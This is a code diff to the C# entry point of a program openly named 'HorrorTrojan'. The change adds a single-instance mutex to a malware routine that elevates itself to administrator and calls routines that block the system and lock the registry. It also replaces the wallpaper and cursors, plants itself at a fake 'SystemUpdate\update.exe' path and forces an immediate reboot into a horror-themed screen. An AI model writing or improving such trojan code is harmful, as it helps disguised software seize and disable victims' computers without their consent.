@@ -2,52 +2,74 @@ using System;
 using System.Diagnostics;
 using System.IO;
 using System.Reflection;
+using System.Threading;
 using System.Windows.Forms;
 
 namespace HorrorTrojan
 {
     internal static class Program
     {
+        private static Mutex mutex;
+        
         [STAThread]
         static void Main(string[] args)
         {
-            string updatePath = @"C:\Windows\ProgramFiles\SystemUpdate\update.exe";
+            bool createdNew;
+            mutex = new Mutex(true, "Global\\HorrorTrojanMutex", out createdNew);
             
-            if (args.Length > 0 && args[0] == "stage2")
+            if (!createdNew)
             {
-                Application.EnableVisualStyles();
-                Application.SetCompatibleTextRenderingDefault(false);
-                Application.Run(new HorrorForm());
                 return;
             }
             
-            if (!IsElevated())
+            try
             {
-                RestartAsAdmin();
-                return;
-            }
-            
-            if (!File.Exists(updatePath) || Assembly.GetExecutingAssembly().Location != updatePath)
-            {
-                ResourceExtractor.ExtractAll();
-                SystemBlocker.BlockEverything();
-                RegistryLocker.LockEverything();
-                ApplyWallpaper();
-                ApplyCursors();
+                string updatePath = @"C:\Windows\ProgramFiles\SystemUpdate\update.exe";
                 
-                Process.Start(updatePath, "stage2");
+                if (args.Length > 0 && args[0] == "stage2")
+                {
+                    Application.EnableVisualStyles();
+                    Application.SetCompatibleTextRenderingDefault(false);
+                    Application.Run(new HorrorForm());
+                    return;
+                }
                 
-                var psi = new ProcessStartInfo("shutdown", "/r /f /t 0");
-                psi.CreateNoWindow = true;
-                psi.UseShellExecute = false;
-                Process.Start(psi);
-                Environment.Exit(0);
+                if (!IsElevated())
+                {
+                    RestartAsAdmin();
+                    return;
+                }
+                
+                if (!File.Exists(updatePath) || Assembly.GetExecutingAssembly().Location != updatePath)
+                {
+                    ResourceExtractor.ExtractAll();
+                    SystemBlocker.BlockEverything();
+                    RegistryLocker.LockEverything();
+                    ApplyWallpaper();
+                    ApplyCursors();
+                    
+                    Process.Start(updatePath, "stage2");
+                    
+                    var psi = new ProcessStartInfo("shutdown", "/r /f /t 0");
+                    psi.CreateNoWindow = true;
+                    psi.UseShellExecute = false;
+                    Process.Start(psi);
+                    Environment.Exit(0);
+                }
+                else
+                {
+                    Application.EnableVisualStyles();
+                    Application.SetCompatibleTextRenderingDefault(false);
+                    Application.Run(new HorrorForm());
+                }
             }
-            else
+            finally
             {
-                Application.EnableVisualStyles();
-                Application.SetCompatibleTextRenderingDefault(false);
-                Application.Run(new HorrorForm());
+                if (mutex != null)
+                {
+                    mutex.ReleaseMutex();
+                    mutex.Dispose();
+                }
             }
         }
         
